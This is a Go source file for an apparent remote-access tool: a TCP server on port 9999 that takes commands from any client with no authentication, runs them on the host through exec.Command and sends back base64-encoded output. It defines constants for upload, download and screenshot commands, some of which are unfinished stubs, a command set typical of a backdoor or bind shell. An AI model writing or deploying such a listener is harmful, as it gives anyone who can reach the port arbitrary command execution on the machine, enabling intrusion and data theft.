package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

const COMMAND_EXEC = "exec"
const COMMAND_PS = "ps"
const COMMAND_UPLOAD = "upload"
const COMMAND_DOWNLOAD = "download"
const COMMAND_SCREENSHOT = "screenshot"

func tokenize(input string) []string {
	tokens := strings.Split(input, " ")
	return tokens
}

func encode(input string) string {
	return base64.StdEncoding.EncodeToString([]byte(input))
}

func connectionHandler(connection net.Conn) {
	// Read from client
	for {

		fmt.Printf("Reading from %s...\n", connection.RemoteAddr().String())
		message, err := bufio.NewReader(connection).ReadString('\n')
		message = strings.TrimSpace(message)

		if err != nil {
			if err.Error() == "EOF" || err.Error() == "read: connection reset by peer" {
				fmt.Printf("Client seems to have closed the connection...")
				return
			}
			fmt.Printf("Whoops, something went wrong with '%s': '%s'\n", connection.RemoteAddr().String(), err.Error())
			return
		}

		// Get command as slice
		command := tokenize(message)

		// First element should be a recognized command
		cmd := strings.ToLower(command[0])
		fmt.Printf("Client sent: '%s'\n", cmd)
		switch cmd {
		case "exec":
			{
				exe := command[1]
				args := command[2:]
				fmt.Printf("Executing '%s' with args '%s'\n", exe, args)
				theCommand := exec.Command(exe, args...)

				out, err := theCommand.CombinedOutput()
				if err != nil {
					connection.Write([]byte("exec command failed: "))
					connection.Write([]byte(message))
					connection.Write([]byte(" -> "))
					connection.Write([]byte(err.Error()))
					connection.Write([]byte("\n"))
					continue
				}
				fmt.Println("Command output:\n" + string(out))
				connection.Write([]byte(encode(string(out))))
				connection.Write([]byte("\n"))
			}
		case "ps":
			{
				connection.Write([]byte("Showing server's process list\n"))
			}
		case "upload":
			{
				// Needs a file at least
				if len(command) < 3 {
					connection.Write([]byte("usage: upload <localfile> <remotefile>\n"))
					continue
				}

				connection.Write([]byte("Upload started\n"))
			}
		default:
			{
				connection.Write([]byte("Sorry, that's not a command that I understand\n"))
				continue
			}
		}
	}
}

func main() {

	fmt.Println("Starting server on 0.0.0.0:9999")
	listener, err := net.Listen("tcp", "0.0.0.0:9999")

	if err != nil {
		panic(err)
	}

	// Infinite loop
	for {
		fmt.Println("Waiting for client connection")
		connection, err := listener.Accept()
		defer connection.Close()
		if err != nil {
			panic(err)
		}

		fmt.Println("Client connected")

		go connectionHandler(connection)
	}

}
